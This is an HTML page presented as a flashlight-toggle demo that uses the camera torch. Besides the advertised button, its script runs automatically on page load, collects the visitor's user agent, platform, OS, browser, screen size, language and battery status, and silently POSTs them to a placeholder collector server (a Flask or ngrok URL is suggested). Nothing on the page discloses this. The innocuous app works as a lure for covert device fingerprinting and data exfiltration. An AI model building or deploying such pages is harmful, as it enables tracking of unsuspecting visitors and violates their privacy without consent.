<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flashlight Control</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        p {
            font-size: 1.2em;
            color: #333;
        }
        button {
            padding: 10px 20px;
            font-size: 1em;
            margin: 10px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <p>Flashlight Control Demo</p>
    <button onclick="toggleFlashlight()">Toggle Flashlight</button>
    <p id="status">Flashlight is OFF</p>
    <script>
        let stream = null;
        let flashlightOn = false;

        async function toggleFlashlight() {
            try {
                if (!flashlightOn) {
                    // Request camera access with torch enabled
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "environment", torch: true }
                    });
                    const track = stream.getVideoTracks()[0];
                    await track.applyConstraints({ advanced: [{ torch: true }] });
                    flashlightOn = true;
                    document.getElementById("status").textContent = "Flashlight is ON";
                } else {
                    // Turn off flashlight by stopping the stream
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                        stream = null;
                    }
                    flashlightOn = false;
                    document.getElementById("status").textContent = "Flashlight is OFF";
                }
            } catch (err) {
                console.error("Error accessing flashlight:", err);
                document.getElementById("status").textContent = "Error: " + err.message;
            }
        }

        function getDeviceInfo() {
            const info = {
                "User Agent": navigator.userAgent || "Unknown",
                "Platform": navigator.platform || "Unknown",
                "OS": getOS(navigator.userAgent),
                "Browser": getBrowser(navigator.userAgent),
                "Screen Resolution": `${window.screen.width}x${window.screen.height}`,
                "Device Pixel Ratio": window.devicePixelRatio || "Unknown",
                "Language": navigator.language || "Unknown",
                "Timestamp": new Date().toLocaleString()
            };

            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    info.Battery = `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging ? 'Yes' : 'No'})`;
                    sendToServer(info);
                }).catch(err => {
                    info.Battery = "Battery info unavailable: " + err.message;
                    sendToServer(info);
                });
            } else {
                info.Battery = "Battery API not supported";
                sendToServer(info);
            }
        }

        function getOS(userAgent) {
            if (/android/i.test(userAgent)) return "Android";
            if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
            if (/Win/i.test(userAgent)) return "Windows";
            if (/Mac/i.test(userAgent)) return "macOS";
            if (/Linux/i.test(userAgent)) return "Linux";
            return "Unknown";
        }

        function getBrowser(userAgent) {
            if (/chrome|crios/i.test(userAgent)) return "Chrome";
            if (/firefox|fxios/i.test(userAgent)) return "Firefox";
            if (/safari/i.test(userAgent) && !/chrome|crios/i.test(userAgent)) return "Safari";
            if (/edge/i.test(userAgent)) return "Edge";
            return "Unknown";
        }

        function sendToServer(info) {
            // Replace with your server URL (e.g., Flask server or ngrok URL)
            const serverUrl = "http://your-server-url:8000/submit";
            fetch(serverUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(info)
            })
                .then(response => response.json())
                .then(data => console.log("Data sent:", data))
                .catch(err => console.error("Failed to send:", err));
        }

        // Run device info collection on page load
        window.onload = getDeviceInfo;
    </script>
</body>
</html>
